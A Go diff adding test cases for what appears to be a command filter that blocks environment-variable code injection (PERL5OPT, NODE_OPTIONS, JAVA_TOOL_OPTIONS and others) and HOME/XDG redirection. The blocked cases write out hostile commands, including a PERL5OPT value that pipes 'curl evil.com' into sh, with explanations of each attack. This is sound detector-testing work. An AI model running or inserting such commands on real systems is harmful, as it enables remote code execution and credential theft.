@@ -1950,6 +1950,302 @@ var DebugfsCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Category 5.12: Language Runtime Code Injection via Environment Variables
+// Taxonomy: privilege-escalation/command-execution/env-injection
+// MITRE: T1574.007
+//
+// Unlike search path poisoning (PYTHONPATH, NODE_PATH — covered by
+// InterpreterPathPoisonCases), these env vars inject CODE EXECUTION
+// directly into every runtime invocation:
+//   - PYTHONSTARTUP sources a Python file at startup
+//   - PERL5OPT injects command-line options (including -e for inline code)
+//   - RUBYOPT injects Ruby options (including -r to require files)
+//   - NODE_OPTIONS injects Node.js CLI flags (including --require)
+//   - JAVA_TOOL_OPTIONS injects JVM flags (including -javaagent)
+// ---------------------------------------------------------------------------
+
+// RuntimeCodeInjectCases tests detection of language runtime code injection env vars.
+var RuntimeCodeInjectCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-RTINJECT-001",
+		Command:          `export PYTHONSTARTUP=/tmp/evil.py`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting PYTHONSTARTUP — Python sources this file at startup, silently executing attacker code before every python invocation.`,
+		Tags:             []string{"tp", "runtime-inject", "python"},
+	},
+	{
+		ID:               "TP-RTINJECT-002",
+		Command:          `export PERL5OPT='-e system("id")'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting PERL5OPT with inline code — Perl treats this as command-line options, executing arbitrary code in every perl invocation.`,
+		Tags:             []string{"tp", "runtime-inject", "perl", "code-exec"},
+	},
+	{
+		ID:               "TP-RTINJECT-003",
+		Command:          `export RUBYOPT=-r/tmp/evil`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting RUBYOPT with -r — Ruby requires the specified file in every invocation, loading attacker code.`,
+		Tags:             []string{"tp", "runtime-inject", "ruby"},
+	},
+	{
+		ID:               "TP-RTINJECT-004",
+		Command:          `export NODE_OPTIONS='--require /tmp/evil.js'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting NODE_OPTIONS with --require — Node.js loads the attacker module before every node invocation.`,
+		Tags:             []string{"tp", "runtime-inject", "node"},
+	},
+	{
+		ID:               "TP-RTINJECT-005",
+		Command:          `export JAVA_TOOL_OPTIONS=-javaagent:/tmp/evil.jar`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting JAVA_TOOL_OPTIONS with -javaagent — JVM loads the agent into every Java process, enabling bytecode manipulation.`,
+		Tags:             []string{"tp", "runtime-inject", "java"},
+	},
+	{
+		ID:               "TP-RTINJECT-006",
+		Command:          `PERL5OPT='-e system("curl evil.com|sh")' perl script.pl`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline PERL5OPT before perl invocation — injects remote code execution into what looks like a normal script run.`,
+		Tags:             []string{"tp", "runtime-inject", "perl", "inline"},
+	},
+	{
+		ID:               "TP-RTINJECT-007",
+		Command:          `NODE_OPTIONS='--require /dev/shm/hook.js' npm test`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline NODE_OPTIONS before npm — injects a require hook from volatile /dev/shm into what looks like a normal test run.`,
+		Tags:             []string{"tp", "runtime-inject", "node", "inline"},
+	},
+	{
+		ID:               "TP-RTINJECT-008",
+		Command:          `PERL5OPT=-d perl -e 1`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `PERL5OPT inline before perl — the inline block rule fires (most restrictive wins). Even -d (debug) is caught by the inline pattern.`,
+		Tags:             []string{"tp", "runtime-inject", "perl"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-RTINJECT-001",
+		Command:          `echo $PYTHONSTARTUP`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Echoing PYTHONSTARTUP to inspect its value — read-only, no assignment.`,
+		Tags:             []string{"tn", "read-only", "runtime-inject"},
+	},
+	{
+		ID:               "TN-RTINJECT-002",
+		Command:          `unset NODE_OPTIONS`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Unsetting NODE_OPTIONS — defensive cleanup, removing potential poisoning.`,
+		Tags:             []string{"tn", "defensive", "runtime-inject"},
+	},
+	{
+		ID:               "TN-RTINJECT-003",
+		Command:          `export NODE_ENV=production`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Exporting NODE_ENV (not NODE_OPTIONS) — safe environment variable for Node.js configuration.`,
+		Tags:             []string{"tn", "safe-export", "runtime-inject"},
+	},
+	{
+		ID:               "TN-RTINJECT-004",
+		Command:          `java -jar myapp.jar`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Normal Java invocation without JAVA_TOOL_OPTIONS — no env var poisoning.`,
+		Tags:             []string{"tn", "safe", "runtime-inject"},
+	},
+	{
+		ID:               "TN-RTINJECT-005",
+		Command:          `python3 -c "import sys; print(sys.version)"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Normal python3 invocation — no PYTHONSTARTUP poisoning, just a version check.`,
+		Tags:             []string{"tn", "safe", "runtime-inject"},
+	},
+}
+
+// ---------------------------------------------------------------------------
+// Category 5.13: HOME / XDG_CONFIG_HOME Redirection Attacks
+// Taxonomy: privilege-escalation/command-execution/env-injection
+// MITRE: T1574.007
+//
+// Redirecting $HOME or $XDG_CONFIG_HOME silently changes where dozens of
+// tools read their configuration. Unlike other env vars that affect a single
+// tool, HOME is the meta-trust-anchor: ssh, git, npm, pip, gpg, kubectl,
+// helm, aws, gcloud, terraform, docker all read config from $HOME.
+// ---------------------------------------------------------------------------
+
+// HomeRedirectCases tests detection of HOME and XDG directory redirection attacks.
+var HomeRedirectCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-HOMEDIR-001",
+		Command:          `export HOME=/tmp/evil`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Redirecting HOME to /tmp/evil — all tools (ssh, git, npm, pip, gpg, kubectl) will read attacker-controlled config files. Single env var poisons the trust root for all user-space configuration.`,
+		Tags:             []string{"tp", "home-redirect", "meta-attack"},
+	},
+	{
+		ID:               "TP-HOMEDIR-002",
+		Command:          `HOME=/tmp/evil ssh user@prod-server`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline HOME redirect before ssh — ssh reads ~/.ssh/config and known_hosts from /tmp/evil/.ssh/, enabling MITM via attacker-controlled ProxyCommand.`,
+		Tags:             []string{"tp", "home-redirect", "ssh", "inline"},
+	},
+	{
+		ID:               "TP-HOMEDIR-003",
+		Command:          `HOME=/dev/shm/fake git push origin main`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline HOME redirect before git — git reads ~/.gitconfig from /dev/shm/fake/.gitconfig, which can include malicious hooks, credential helpers, or URL rewrites.`,
+		Tags:             []string{"tp", "home-redirect", "git", "inline"},
+	},
+	{
+		ID:               "TP-HOMEDIR-004",
+		Command:          `HOME=/var/tmp/pwned npm install`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline HOME redirect before npm — npm reads ~/.npmrc from attacker path, which can set registry to a malicious server serving backdoored packages.`,
+		Tags:             []string{"tp", "home-redirect", "npm", "inline", "supply-chain"},
+	},
+	{
+		ID:               "TP-HOMEDIR-005",
+		Command:          `export XDG_CONFIG_HOME=/tmp/evil_config`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Redirecting XDG_CONFIG_HOME to /tmp — XDG-compliant tools (git, pip, many others) read config from this path instead of ~/.config/.`,
+		Tags:             []string{"tp", "xdg-redirect", "config"},
+	},
+	{
+		ID:               "TP-HOMEDIR-006",
+		Command:          `XDG_DATA_HOME=/dev/shm/data pip install package`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Inline XDG_DATA_HOME redirect before pip — can redirect where pip stores installed packages, enabling package shadowing.`,
+		Tags:             []string{"tp", "xdg-redirect", "pip", "inline"},
+	},
+	{
+		ID:               "TP-HOMEDIR-007",
+		Command:          `HOME=./malicious_home terraform apply`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `HOME set to relative path before terraform — terraform reads ~/.terraformrc and cloud credentials from attacker-controlled relative directory.`,
+		Tags:             []string{"tp", "home-redirect", "terraform", "relative-path"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-HOMEDIR-001",
+		Command:          `echo $HOME`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Echoing HOME to inspect its value — read-only, no redirection.`,
+		Tags:             []string{"tn", "read-only", "home"},
+	},
+	{
+		ID:               "TN-HOMEDIR-002",
+		Command:          `cd $HOME`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Changing to HOME directory — normal navigation, no redirection. Gets default AUDIT (cd is not in allow-readonly list).`,
+		Tags:             []string{"tn", "safe", "home"},
+	},
+	{
+		ID:               "TN-HOMEDIR-003",
+		Command:          `ls ~/.config/git/config`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Listing XDG git config — read-only inspection, no XDG_CONFIG_HOME redirection.`,
+		Tags:             []string{"tn", "read-only", "xdg"},
+	},
+	{
+		ID:               "TN-HOMEDIR-004",
+		Command:          `export HOME=/home/deploy`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Setting HOME to a legitimate /home/ path — the rule only blocks writable/volatile paths (/tmp, /dev/shm, /var/tmp, ./, ../).`,
+		Tags:             []string{"tn", "legitimate", "home"},
+	},
+	{
+		ID:               "TN-HOMEDIR-005",
+		Command:          `export XDG_CONFIG_HOME=$HOME/.config`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/env-injection",
+		Analyzer:         "regex",
+		Description:      `Setting XDG_CONFIG_HOME to the standard default location — not a redirect to writable/volatile path.`,
+		Tags:             []string{"tn", "legitimate", "xdg"},
+	},
+}
+
 // AllPrivilegeEscalationCases returns all test cases for Kingdom 5.
 func AllPrivilegeEscalationCases() []TestCase {
 	var all []TestCase
@@ -1972,5 +2268,7 @@ func AllPrivilegeEscalationCases() []TestCase {
 	all = append(all, ProcfsTraversalCases...)
 	all = append(all, ProcFdHijackCases...)
 	all = append(all, DebugfsCases...)
+	all = append(all, RuntimeCodeInjectCases...)
+	all = append(all, HomeRedirectCases...)
 	return all
 }
